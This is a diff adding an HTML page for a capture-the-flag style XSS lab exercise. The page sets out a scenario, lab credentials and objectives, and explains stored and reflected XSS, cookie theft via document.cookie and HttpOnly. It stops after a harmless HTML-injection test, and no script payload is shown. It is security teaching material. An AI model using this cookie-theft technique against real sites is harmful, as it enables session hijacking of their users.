@@ -1,0 +1,1530 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Network forensics exercises for OpenCyberRange">
+      
+      
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.2">
+    
+    
+      
+        <title>Exercise CF2.5: Cross-Site Scripting (XSS) - Network Forensics</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css?v=4">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="deep-purple" data-md-color-accent="purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#exercise-cf25-cross-site-scripting-xss" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Network Forensics" class="md-header__button md-logo" aria-label="Network Forensics" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Network Forensics
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Exercise CF2.5: Cross-Site Scripting (XSS)
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="deep-purple" data-md-color-accent="purple"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="deep-purple" data-md-color-accent="purple"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Network Forensics" class="md-nav__button md-logo" aria-label="Network Forensics" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Network Forensics
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH N1 -- Log Analysis
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH N1 -- Log Analysis
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/01_Port_Scan_Detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.1 -- Port Scan Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/02_HTTP_Traffic_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.2 -- HTTP Traffic Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/03_DNS_Anomaly_Detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.3 -- DNS Anomaly Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/04_Failed_Login_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.4 -- Failed Login Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET01_Log_Analysis/05_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH N2 -- PCAP Forensics
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH N2 -- PCAP Forensics
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/01_FTP_Credential_Extraction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.1 -- FTP Credential Extraction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/02_SMTP_Email_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.2 -- SMTP Email Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/03_HTTP_Session_Hijacking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.3 -- HTTP Session Hijacking
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/04_DNS_Data_Exfiltration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.4 -- DNS Data Exfiltration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/05_Attack_Chain_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.5 -- Attack Chain Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NET02_PCAP_Forensics/06_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH N3 -- Firewalls
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH N3 -- Firewalls
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NETSY12_Firewalls/01_Firewall_Fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 3.1 -- Firewall Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_NETSY12_Firewalls/02_Firewall_Policy_Hardening/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 3.2 -- Firewall Policy Hardening
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#before-you-begin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Before You Begin
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scenario" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scenario
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#your-objectives" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Your Objectives
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#background-cross-site-scripting-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Background: Cross-Site Scripting (XSS)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Background: Cross-Site Scripting (XSS)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-is-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What Is XSS?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#types-of-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Types of XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#how-cookie-theft-works" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        How Cookie Theft Works
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-httponly-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The HttpOnly Flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#same-origin-exfiltration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Same-Origin Exfiltration
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tool-primer-xss-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tool Primer: XSS Payloads
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Tool Primer: XSS Payloads">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#testing-for-html-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Testing for HTML Injection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#script-injection-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Script Injection Payloads
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#same-origin-cookie-exfiltration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Same-Origin Cookie Exfiltration
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#walkthrough" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Walkthrough
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Walkthrough">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-launch-the-exercise" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 1: Launch the Exercise
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-add-the-target-to-etchosts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 2: Add the Target to /etc/hosts
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-authenticate-and-explore-the-support-platform" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 3: Authenticate and Explore the Support Platform
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-submit-feedback-with-html-tags" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 4: Submit Feedback with HTML Tags
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-5-test-script-tag-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 5: Test Script Tag Injection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-6-test-for-reflected-xss-on-the-search-endpoint" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 6: Test for Reflected XSS on the Search Endpoint
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-7-craft-a-same-origin-cookie-theft-payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 7: Craft a Same-Origin Cookie Theft Payload
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-8-retrieve-the-admin-cookie-and-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 8: Retrieve the Admin Cookie and Flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#record-your-findings" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Record Your Findings
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#analysis-questions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Analysis Questions
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#key-takeaways" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Key Takeaways
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="exercise-cf25-cross-site-scripting-xss">Exercise CF2.5: Cross-Site Scripting (XSS)</h1>
+<h2 id="before-you-begin">Before You Begin</h2>
+<p>You should have completed Exercises CF2.1 through CF2.4. Those exercises focused on server-side vulnerabilities: brute-force, session forgery, SQL injection, and broken access control. Exercise CF2.5 introduces a client-side attack: Cross-Site Scripting (XSS). Instead of attacking the server directly, you inject code that executes in another user's browser. Your VPN must be connected and your terminal open before continuing.</p>
+<h2 id="scenario">Scenario</h2>
+<p>CapitalFlow Markets runs a customer support platform with a feedback form. Traders and investors use the form to submit questions and complaints. Support staff review the submissions through an admin dashboard. Sarah Chen (CTO) flagged a concern: "Our support team copies feedback text directly into their dashboard. Nobody on the team has tested whether the feedback form sanitizes HTML or JavaScript."</p>
+<p>You will log in as a trader, submit feedback containing HTML and JavaScript payloads, and test whether the application stores and renders the input without sanitization. The goal is to demonstrate that a stored XSS payload can steal the admin user's session cookie, which contains the flag.</p>
+<p>A support administrator reviews new feedback in the admin dashboard. The lab models that review server-side: when you submit a working cookie-theft payload, the simulated admin opens the feedback page and the injected script runs in the admin's browser context. Lab egress is blocked, so the payload cannot reach an external server. The exfiltration target must be same-origin: the support platform exposes <code>POST /api/steal</code> for the payload to post to, and <code>GET /api/stolen</code> for you to read the captured data back.</p>
+<p><strong>Target:</strong> capitalflow-support.lab (port 80)</p>
+<p><strong>Credentials:</strong> trader@capitalflow.com / Trader2024#</p>
+<h2 id="your-objectives">Your Objectives</h2>
+<ul>
+<li>Add the target hostname to <code>/etc/hosts</code> and authenticate as the trader</li>
+<li>Submit feedback with HTML tags to test for input sanitization</li>
+<li>Confirm stored XSS by verifying that injected HTML renders in the admin dashboard</li>
+<li>Test reflected XSS on the search endpoint</li>
+<li>Craft a stored XSS payload that posts the admin's cookie to the same-origin sink <code>/api/steal</code></li>
+<li>Retrieve the captured admin cookie from <code>/api/stolen</code></li>
+<li>Find and submit the flag in <code>OCR{...}</code> format</li>
+</ul>
+<hr />
+<h2 id="background-cross-site-scripting-xss">Background: Cross-Site Scripting (XSS)</h2>
+<h3 id="what-is-xss">What Is XSS?</h3>
+<p>Cross-Site Scripting (XSS) is a vulnerability that allows an attacker to inject client-side scripts (typically JavaScript) into web pages viewed by other users. When a victim's browser renders the malicious script, it executes with the same privileges as the legitimate page, granting the attacker access to cookies, session tokens, and page content.</p>
+<h3 id="types-of-xss">Types of XSS</h3>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Storage</th>
+<th>Trigger</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Stored (Persistent)</td>
+<td>Payload saved in database</td>
+<td>Victim views the page containing the payload</td>
+<td>Feedback form, forum post, profile bio</td>
+</tr>
+<tr>
+<td>Reflected (Non-Persistent)</td>
+<td>Payload in URL/request</td>
+<td>Victim clicks a crafted link</td>
+<td>Search results page, error messages</td>
+</tr>
+<tr>
+<td>DOM-based</td>
+<td>Payload processed by client-side JavaScript</td>
+<td>Victim visits a page with vulnerable JS</td>
+<td>Single-page applications with unsafe innerHTML</td>
+</tr>
+</tbody>
+</table>
+<p>Stored XSS is the most dangerous type because the payload persists on the server. Every user who views the affected page triggers the script, without needing to click a specially crafted link.</p>
+<h3 id="how-cookie-theft-works">How Cookie Theft Works</h3>
+<p>Browsers enforce the Same-Origin Policy, which restricts scripts from one domain from accessing data on another domain. However, scripts injected via XSS execute within the target domain's context, giving them full access to that domain's cookies (unless the <code>HttpOnly</code> flag is set). A cookie theft payload reads <code>document.cookie</code> and sends the value to a server the attacker can read.</p>
+<pre class="mermaid"><code>graph TD
+    A["Trader submits feedback&lt;br/&gt;with script tag"] --&gt; B["Server stores payload&lt;br/&gt;in feedback list"]
+    B --&gt; C["Admin reviews feedback&lt;br/&gt;in dashboard (simulated)"]
+    C --&gt; D["Admin browser executes&lt;br/&gt;injected script"]
+    D --&gt; E["Script reads&lt;br/&gt;document.cookie"]
+    E --&gt; F["Cookie posted to&lt;br/&gt;same-origin /api/steal"]
+    F --&gt; G["Trader reads cookie&lt;br/&gt;from /api/stolen"]
+
+    style A fill:#d9534f,color:#fff
+    style D fill:#d9534f,color:#fff
+    style F fill:#d9534f,color:#fff
+    style C fill:#4a90d9,color:#fff</code></pre>
+<h3 id="the-httponly-flag">The HttpOnly Flag</h3>
+<p>The <code>HttpOnly</code> cookie flag tells the browser to block JavaScript from accessing the cookie via <code>document.cookie</code>. Cookies marked <code>HttpOnly</code> can only be sent in HTTP requests, not read by client-side scripts. When <code>HttpOnly</code> is missing, XSS can extract the full cookie value. Checking whether a cookie has the <code>HttpOnly</code> flag is a key step before attempting cookie theft.</p>
+<h3 id="same-origin-exfiltration">Same-Origin Exfiltration</h3>
+<p>A classic cookie-theft payload sends <code>document.cookie</code> to an external attacker server. In this lab, the lab network blocks outbound internet traffic, so an external listener is unreachable. The payload must instead post to a same-origin endpoint that lives on the target itself. The support platform exposes <code>POST /api/steal</code>, which accepts a JSON body and records it. You read the recorded data back from <code>GET /api/stolen</code>. Same-origin exfiltration is also realistic: many real-world XSS payloads beacon to a path on the victim's own domain to avoid cross-origin and CSP restrictions.</p>
+<h2 id="tool-primer-xss-payloads">Tool Primer: XSS Payloads</h2>
+<h3 id="testing-for-html-injection">Testing for HTML Injection</h3>
+<p>Start with simple HTML to confirm the application renders user input without escaping:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="p">&lt;</span><span class="nt">b</span><span class="p">&gt;</span>bold test<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>heading test<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
